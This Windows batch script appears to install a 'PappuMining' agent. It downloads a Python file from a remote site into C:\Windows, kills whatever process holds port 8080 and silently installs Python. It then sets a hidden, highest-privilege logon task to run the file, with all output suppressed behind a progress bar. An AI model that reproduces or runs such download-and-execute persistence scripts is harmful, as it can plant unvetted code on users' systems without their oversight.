@echo off
setlocal EnableDelayedExpansion

set "AGENT_URL=https://pappumining.com/pappu/windows-agent.py"
set "PYFILE=C:\Windows\windows-agent.py"
set "TASKNAME=PappuMiningWindowsAgent"
set "PORT=8080"
set "PYTHON_URL=https://www.python.org/ftp/python/3.13.1/python-3.13.1-amd64.exe"
set "PYTHON_INSTALLER=%TEMP%\python-installer.exe"

call :progress 5

powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%AGENT_URL%' -OutFile '%PYFILE%'" >nul 2>&1
if not exist "%PYFILE%" exit /b

call :progress 15

for /f "tokens=5" %%a in ('netstat -ano ^| findstr :%PORT%') do (
    taskkill /PID %%a /F >nul 2>&1
)

call :progress 25

py --version >nul 2>&1
if errorlevel 1 (
    powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%PYTHON_URL%' -OutFile '%PYTHON_INSTALLER%'" >nul 2>&1
    if not exist "%PYTHON_INSTALLER%" exit /b

    call :progress 40

    "%PYTHON_INSTALLER%" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 Include_launcher=1 >nul 2>&1
    timeout /t 10 /nobreak >nul
)

call :progress 60

set "PATH=%PATH%;C:\Program Files\Python313\;C:\Program Files\Python313\Scripts\;C:\Python313\;C:\Python313\Scripts\"

py -m ensurepip --upgrade >nul 2>&1
py -m pip install --upgrade pip >nul 2>&1
py -m pip install qrcode[pil] >nul 2>&1

call :progress 75

schtasks /Delete /TN "%TASKNAME%" /F >nul 2>&1

schtasks /Create ^
 /TN "%TASKNAME%" ^
 /TR "cmd /c start /min py \"%PYFILE%\"" ^
 /SC ONLOGON ^
 /RL HIGHEST ^
 /F >nul 2>&1

call :progress 90

start "" /min py "%PYFILE%" >nul 2>&1

call :progress 100
echo.
exit /b


:progress
set "PERCENT=%~1"
set /a BARS=%PERCENT%/5
set /a SPACES=20-%BARS%

set "BAR="
for /L %%i in (1,1,%BARS%) do set "BAR=!BAR!#"
for /L %%i in (1,1,%SPACES%) do set "BAR=!BAR!-"

<nul set /p="Working [!BAR!] %PERCENT%%%  "
ping -n 2 127.0.0.1 >nul
echo.
exit /b